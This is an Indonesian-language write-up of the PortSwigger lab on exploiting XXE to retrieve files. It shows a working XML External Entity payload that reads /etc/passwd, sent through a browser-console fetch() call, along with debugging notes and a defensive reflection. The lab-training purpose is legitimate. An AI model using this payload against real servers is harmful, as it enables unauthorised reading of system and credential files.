## 4. XXE Injection: Mengambil Konten File 

### 4.1. [Soal]

-   **Nama Laboratorium:** Exploiting XXE to retrieve files
-   **Deskripsi:** Laboratorium ini memiliki kerentanan XML External Entity (XXE). Tujuannya adalah untuk mengeksploitasi kerentanan ini untuk mengambil dan menampilkan isi dari file `/etc/passwd` di sistem operasi server.

### 4.2. [Link resource untuk latihan.]

`https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files`

### 4.3. Jawaban + Bukti

#### Step-by-step yang sudah dicoba

1.  **Analisis Fungsi Aplikasi dan Persiapan:** Saya mengidentifikasi bahwa fitur "Check stock" pada halaman produk kemungkinan besar berkomunikasi dengan server menggunakan XML. Karena saya tidak menggunakan Burp Suite, saya berencana untuk membuat *request* HTTP saya sendiri dari awal menggunakan Developer Tools (F12) di browser, khususnya pada tab "Console".

2.  **Percobaan Pertama dan Analisis Kegagalan (Error 400):** Saya membuat payload XXE pertama saya menggunakan fungsi `fetch()` di JavaScript.
    -   **Kode yang dicoba (Salah):**
        ```javascript
        const xmlPayload = `
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <stockCheck>
            <productId>&xxe;</productId>
            <storeId>1</storeId>
        </stockCheck>
        `;
        
        fetch('/product/stock', { /* ... */ });
        ```
    -   Ketika saya menjalankan kode ini, saya mendapatkan error `POST https://.../product/stock 400 (Bad Request)` di console. Setelah diperiksa lebih lanjut, pesan error dari parser XML server adalah `The processing instruction target matching "[xX][mM][lL]" is not allowed.`.
    -   Ini mengindikasikan bahwa deklarasi `<?xml ... ?>` tidak berada di awal dokumen, yang disebabkan oleh baris baru (*newline*) di dalam *template literal* JavaScript saya.

3.  **Koreksi Payload dan Eksekusi Ulang:** Saya memperbaiki payload dengan menghapus spasi atau baris baru di awal string XML, sehingga deklarasi `<?xml ... ?>` menjadi karakter pertama.
    -   **Kode yang diperbaiki (Benar):**
        ```javascript
        const xmlPayload = `<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <stockCheck>
            <productId>&xxe;</productId>
            <storeId>1</storeId>
        </stockCheck>
        `;

        fetch('/product/stock', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/xml'
            },
            body: xmlPayload
        })
        .then(response => response.text())
        .then(data => console.log(data));
        ```
    -   Saya menempelkan kode yang sudah diperbaiki ini ke dalam console dan menekannya.

4.  **Verifikasi Hasil:** Setelah kode dieksekusi, respons dari server langsung dicetak di console. Respons tersebut berisi pesan error dari aplikasi yang digabungkan dengan konten dari file `/etc/passwd`. Ini adalah bukti keberhasilan eksploitasi.

#### Bukti Screenshot

#### Catatan hasil percobaan

-   **Status:** Berhasil.
-   **Alasan:** Aplikasi memiliki parser XML yang rentan terhadap XXE karena tidak menonaktifkan resolusi entitas eksternal. Dengan mengirimkan payload XML yang dibuat dengan benar, saya berhasil memaksa server untuk membaca file lokal (`/etc/passwd`) dan memasukkan isinya ke dalam respons. Aplikasi kemudian menampilkan konten file ini sebagai bagian dari pesan error "Invalid product ID".
-   **Refleksi:**
    -   Pengalaman ini mengajarkan pentingnya detail sintaks. Sebuah baris baru yang tampaknya sepele dapat menyebabkan seluruh payload gagal. Memahami pesan error dari server adalah kunci untuk mendiagnosis masalah.
    -   Saya belajar bahwa kerentanan sisi server yang kompleks seperti XXE dapat dieksploitasi sepenuhnya hanya dengan menggunakan *tools* bawaan browser, selama kita memahami cara kerja protokol HTTP dan format data yang digunakan.
    -   Kebocoran informasi melalui pesan error adalah pola kerentanan yang umum. Aplikasi seharusnya tidak pernah menampilkan kembali input pengguna yang tidak valid secara mentah dalam pesan error.